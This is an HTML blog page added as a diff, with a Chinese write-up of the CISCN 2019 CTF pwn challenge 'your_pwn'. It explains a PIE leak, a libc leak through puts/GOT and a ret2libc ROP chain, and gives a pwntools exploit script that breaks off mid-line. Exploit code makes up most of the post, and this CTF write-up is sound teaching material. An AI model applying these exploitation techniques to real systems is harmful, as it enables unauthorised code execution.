@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,writeup,pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="大伙儿都来打比赛了，我也来凑凑热闹。">
+<meta name="keywords" content="ctf,writeup,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn2019线上赛-pwn">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/ciscn2019线上/index.html">
+<meta property="og:site_name" content="Muirelle的博客">
+<meta property="og:description" content="大伙儿都来打比赛了，我也来凑凑热闹。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/0qvPFbV.png">
+<meta property="og:image" content="https://i.imgur.com/DdK6gVc.png">
+<meta property="og:image" content="https://i.imgur.com/thFcSJq.png">
+<meta property="og:image" content="https://i.imgur.com/gufNsW6.png">
+<meta property="og:updated_time" content="2019-04-23T11:23:29.922Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ciscn2019线上赛-pwn">
+<meta name="twitter:description" content="大伙儿都来打比赛了，我也来凑凑热闹。">
+<meta name="twitter:image" content="https://i.imgur.com/0qvPFbV.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/22/ciscn2019线上/"/>
+
+
+
+
+
+  <title>ciscn2019线上赛-pwn | Muirelle的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Muirelle的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/ciscn2019线上/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Muirelle">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Muirelle的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ciscn2019线上赛-pwn</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-22T20:14:21+08:00">
+                2019-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/04/22/ciscn2019线上/" class="leancloud_visitors" data-flag-title="ciscn2019线上赛-pwn">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>大伙儿都来打比赛了，我也来凑凑热闹。</p>
+<a id="more"></a>
+<p>第一天跟第一个pwn题磕了一下午，始终没注意到脚本某个地方出了一点问题，导致始终得不到回显，然后卡了半天，晚上终于搞出来了。但是比赛结束之后反思了一下做题时整个思路，发现其实并不是很通畅，而且最后脚本出奇的冗长，无法直视。。。寻思着绝对还有更简单的解法，膜一下开赛5分钟就pwn掉的大佬。</p>
+<h1 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h1><p>docker环境：<strong>muirelle/ciscn2019:your_pwn</strong></p>
+<p>解题过程：<strong>栈溢出-&gt;劫持程序流程-&gt;泄露pie-&gt;泄露got表-&gt;泄露libc-&gt;计算system&amp;binsh偏移-&gt;loop-&gt;栈溢出-&gt;ret2libc-&gt;get shell</strong></p>
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><hr>
+<p><img src="https://i.imgur.com/0qvPFbV.png" alt=""></p>
+<p>保护基本都开了</p>
+<p><img src="https://i.imgur.com/DdK6gVc.png" alt=""><br>进main函数看看，似乎溢出不了，那就去sub_b35看看</p>
+<p><img src="https://i.imgur.com/thFcSJq.png" alt=""></p>
+<p>简单分析一下，可以发现在17行和20行程序直接给我们提供了可重复利用的栈任意位置读写功能。控制v1可以读取(v4+v1)所指向内容的值。控制v2可以将v2的值写入(v4+v1)对应的地址。但是注意一点，一次只能读取和写入一字节的数据。</p>
+<p>结合程序开的保护，最后选ret2libc。</p>
+<p>简单的计算一下偏移之后，就可以直接劫持函数流了。</p>
+<p>所以按照一开始的思路，一步一步往后做就行了。在本地测试的时候，每次只返回一个字节没错，但连上服务器再测试却会随机返回多于一个字节的数据，让我停在这个地方想了半天原因，多次测试之后才发现：如果本应返回3b这个数据，结果却返回了ffffff3b的话，可以直接无视掉前面的f，只取最低位一个字节就行了。不知道为啥会这样。。。</p>
+<h2 id="思路历程"><a href="#思路历程" class="headerlink" title="思路历程"></a>思路历程</h2><hr>
+<p>由于程序提供了puts，所以可以用puts来打印got表的内容从而泄露libc。前提是要先得到puts的地址才能调用它。由于程序开了pie保护，所以我们最初只能拿到代码段的地址偏移，但是通过程序自带的栈内容泄露功能，我们可以直接泄露出函数的返回地址，从而得到代码段的真实地址</p>
+<h3 id="index-value"><a href="#index-value" class="headerlink" title="index_value"></a>index_value</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_value</span><span class="params">(index,value=<span class="number">-1</span>)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'index\n'</span>)</span><br><span class="line">    r.sendline(index)</span><br><span class="line">    r.recvuntil(<span class="string">'(hex) '</span>)</span><br><span class="line">    v = int(r.recvuntil(<span class="string">'value\n'</span>).split(<span class="string">'\n'</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">'value: '</span>+hex(v))</span><br><span class="line">    <span class="keyword">if</span> (value==<span class="number">-1</span>):</span><br><span class="line">        r.sendline(str(v))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(str(int(value,<span class="number">16</span>)))</span><br><span class="line">        log.info(<span class="string">'change to: '</span>+hex(int(value,<span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> v</span><br></pre></td></tr></table></figure>
+<p>先写一个函数便于利用程序的读写功能。</p>
+<h3 id="leak-ret"><a href="#leak-ret" class="headerlink" title="leak_ret"></a>leak_ret</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ret_0 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'344'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_1 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'345'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_2 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'346'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_3 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'347'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_4 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'348'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret_5 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'349'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">ret =  ret_5 + ret_4 + ret_3 + ret_2 + ret_1 + ret_0</span><br><span class="line">ret = ret.encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+<p>泄露六次可以得到完整的地址。</p>
+<h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ROP_1:pop_rdi_ret: 0xd03</span></span><br><span class="line">index_value(<span class="string">'344'</span>,<span class="string">'3'</span>)</span><br><span class="line">index_value(<span class="string">'345'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line">puts_off = <span class="number">0x20176a</span></span><br><span class="line">puts_got_plt = hex(int(ret[:<span class="number">-3</span>]+<span class="string">'8b6'</span>,<span class="number">16</span>)+puts_off)</span><br><span class="line">    log.success(<span class="string">'puts_got_plt: '</span>+puts_got_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_2:leak_puts_addr</span></span><br><span class="line">index_value(<span class="string">'352'</span>,puts_got_plt[<span class="number">-2</span>:])</span><br><span class="line">index_value(<span class="string">'353'</span>,puts_got_plt[<span class="number">-4</span>:<span class="number">-2</span>])</span><br><span class="line">index_value(<span class="string">'354'</span>,puts_got_plt[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">index_value(<span class="string">'355'</span>,puts_got_plt[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">index_value(<span class="string">'356'</span>,puts_got_plt[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">index_value(<span class="string">'357'</span>,puts_got_plt[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_3:ret_to_puts</span></span><br><span class="line">index_value(<span class="string">'360'</span>,<span class="string">'b0'</span>)</span><br><span class="line">index_value(<span class="string">'361'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'8'</span>)</span><br><span class="line">index_value(<span class="string">'362'</span>,ret[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">index_value(<span class="string">'363'</span>,ret[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">index_value(<span class="string">'364'</span>,ret[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">index_value(<span class="string">'365'</span>,ret[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_out_of_the_cycle</span></span><br><span class="line">index_value(<span class="string">'-4'</span>,<span class="string">'28'</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#calc_system&amp;binsh</span></span><br><span class="line">r.sendline(<span class="string">'yes\n'</span>)	<span class="comment">#mind recving the '\n'</span></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'name:'</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(<span class="string">'puts_addr: '</span>+hex(puts_addr))</span><br><span class="line">libc_base = puts_addr - puts_libc_off</span><br><span class="line"></span><br><span class="line">system_addr = system_off + libc_base</span><br><span class="line">binsh_addr = binsh_off + libc_base</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'system_addr: '</span>+hex(system_addr))</span><br><span class="line">log.success(<span class="string">'binsh_addr: '</span>+hex(binsh_addr))</span><br><span class="line">r.sendline(<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>
+<p>然后再通过已知偏移计算出puts位于plt表的位置，接着调用puts，泄露got表。</p>
+<p><img src="https://i.imgur.com/gufNsW6.png" alt=""><br>got表相对于plt的偏移可以直接调试找到。</p>
+<h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ROP_4:loop</span></span><br><span class="line">index_value(<span class="string">'368'</span>,<span class="string">'dd'</span>)</span><br><span class="line">index_value(<span class="string">'369'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'a'</span>)</span><br><span class="line">index_value(<span class="string">'370'</span>,ret[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">index_value(<span class="string">'371'</span>,ret[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">index_value(<span class="string">'372'</span>,ret[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">index_value(<span class="string">'373'</span>,ret[<span class="number">-12</span>:<span class="number">-10</span>])</span><br></pre></td></tr></table></figure>
+<p>测试得到了libc之后就可以在ROP链后面添加loop，回到main，然后ret2libc。</p>
+<h2 id="完整exploit"><a href="#完整exploit" class="headerlink" title="完整exploit"></a>完整exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com'</span>,<span class="number">57856</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0xd03</span></span><br><span class="line">puts_plt = <span class="number">0x8b0</span></span><br><span class="line">printf_plt = <span class="number">0x8e0</span></span><br><span class="line">puts_off = <span class="number">0x20176a</span></span><br><span class="line">system_off = <span class="number">0x45390</span></span><br><span class="line">binsh_off = <span class="number">0x18cd57</span></span><br><span class="line">puts_libc_off = <span class="number">0x6f690</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(s)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    r.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_value</span><span class="params">(index,value=<span class="number">-1</span>)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'index\n'</span>)</span><br><span class="line">    r.sendline(index)</span><br><span class="line">    r.recvuntil(<span class="string">'(hex) '</span>)</span><br><span class="line">    v = int(r.recvuntil(<span class="string">'value\n'</span>).split(<span class="string">'\n'</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">'value: '</span>+hex(v))</span><br><span class="line">    <span class="keyword">if</span> (value==<span class="number">-1</span>):</span><br><span class="line">        r.sendline(str(v))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(str(int(value,<span class="number">16</span>)))</span><br><span class="line">        log.info(<span class="string">'change to: '</span>+hex(int(value,<span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    name(<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_ret_value</span></span><br><span class="line">    ret_0 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'344'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_1 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'345'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_2 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'346'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_3 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'347'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_4 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'348'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret_5 = struct.pack(<span class="string">"B"</span>,int(hex(index_value(<span class="string">'349'</span>))[<span class="number">-2</span>:],<span class="number">16</span>))</span><br><span class="line">    ret =  ret_5 + ret_4 + ret_3 + ret_2 + ret_1 + ret_0</span><br><span class="line">    ret = ret.encode(<span class="string">'hex'</span>)</span><br><span class="line">    log.success(<span class="string">'ret: '</span>+ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_1:pop_rdi_ret: 0xd03</span></span><br><span class="line">	index_value(<span class="string">'344'</span>,<span class="string">'3'</span>)</span><br><span class="line">	index_value(<span class="string">'345'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line">	puts_off = <span class="number">0x20176a</span></span><br><span class="line">	puts_got_plt = hex(int(ret[:<span class="number">-3</span>]+<span class="string">'8b6'</span>,<span class="number">16</span>)+puts_off)</span><br><span class="line">	log.success(<span class="string">'puts_got_plt: '</span>+puts_got_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_2:leak_puts_addr</span></span><br><span class="line">	index_value(<span class="string">'352'</span>,puts_got_plt[<span class="number">-2</span>:])</span><br><span class="line">	index_value(<span class="string">'353'</span>,puts_got_plt[<span class="number">-4</span>:<span class="number">-2</span>])</span><br><span class="line">	index_value(<span class="string">'354'</span>,puts_got_plt[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">	index_value(<span class="string">'355'</span>,puts_got_plt[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">	index_value(<span class="string">'356'</span>,puts_got_plt[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">	index_value(<span class="string">'357'</span>,puts_got_plt[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP_3:ret_to_puts</span></span><br><span class="line">	index_value(<span class="string">'360'</span>,<span class="string">'b0'</span>)</span><br><span class="line">	index_value(<span class="string">'361'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'8'</span>)</span><br><span class="line">	index_value(<span class="string">'362'</span>,ret[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">	index_value(<span class="string">'363'</span>,ret[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">	index_value(<span class="string">'364'</span>,ret[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">	index_value(<span class="string">'365'</span>,ret[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_out_of_the_cycle</span></span><br><span class="line">index_value(<span class="string">'-4'</span>,<span class="string">'28'</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#calc_system&amp;binsh</span></span><br><span class="line">	r.sendline(<span class="string">'yes\n'</span>)	<span class="comment">#mind recving the '\n'</span></span><br><span class="line">	puts_addr = u64(r.recvuntil(<span class="string">'name:'</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">	log.success(<span class="string">'puts_addr: '</span>+hex(puts_addr))</span><br><span class="line">	libc_base = puts_addr - puts_libc_off</span><br><span class="line"></span><br><span class="line">	system_addr = system_off + libc_base</span><br><span class="line">	binsh_addr = binsh_off + libc_base</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">'system_addr: '</span>+hex(system_addr))</span><br><span class="line">	log.success(<span class="string">'binsh_addr: '</span>+hex(binsh_addr))</span><br><span class="line">	r.sendline(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#new_ROP_1:pop_rdi_ret</span></span><br><span class="line">    index_value(<span class="string">'344'</span>,<span class="string">'3'</span>)</span><br><span class="line">    index_value(<span class="string">'345'</span>,ret[<span class="number">-4</span>:<span class="number">-3</span>]+<span class="string">'d'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#new_ROP_2:binsh</span></span><br><span class="line"></span><br><span class="line">    index_value(<span class="string">'352'</span>,hex(binsh_addr)[<span class="number">-2</span>:])</span><br><span class="line">    index_value(<span class="string">'353'</span>,hex(binsh_addr)[<span class="number">-4</span>:<span class="number">-2</span>])</span><br><span class="line">    index_value(<span class="string">'354'</span>,hex(binsh_addr)[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">    index_value(<span class="string">'355'</span>,hex(binsh_addr)[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">    index_value(<span class="string">'356'</span>,hex(binsh_addr)[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">    index_value(<span class="string">'357'</span>,hex(binsh_addr)[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line">   <span class="comment"># index_value('358','0')</span></span><br><span class="line">   <span class="comment"># index_value('359','0')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#new_ROP_3:system</span></span><br><span class="line">    index_value(<span class="string">'360'</span>,hex(system_addr)[<span class="number">-2</span>:])</span><br><span class="line">    index_value(<span class="string">'361'</span>,hex(system_addr)[<span class="number">-4</span>:<span class="number">-2</span>])</span><br><span class="line">    index_value(<span class="string">'362'</span>,hex(system_addr)[<span class="number">-6</span>:<span class="number">-4</span>])</span><br><span class="line">    index_value(<span class="string">'363'</span>,hex(system_addr)[<span class="number">-8</span>:<span class="number">-6</span>])</span><br><span class="line">    index_value(<span class="string">'364'</span>,hex(system_addr)[<span class="number">-10</span>:<span class="number">-8</span>])</span><br><span class="line">    index_value(<span class="string">'365'</span>,hex(system_addr)[<span class="number">-12</span>:<span class="number">-10</span>])</span><br><span class="line">   <span class="comment"># index_value('366','0')</span></span><br><span class="line">   <span class="comment"># index_value('367','0')</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    index_value(<span class="string">'-4'</span>,<span 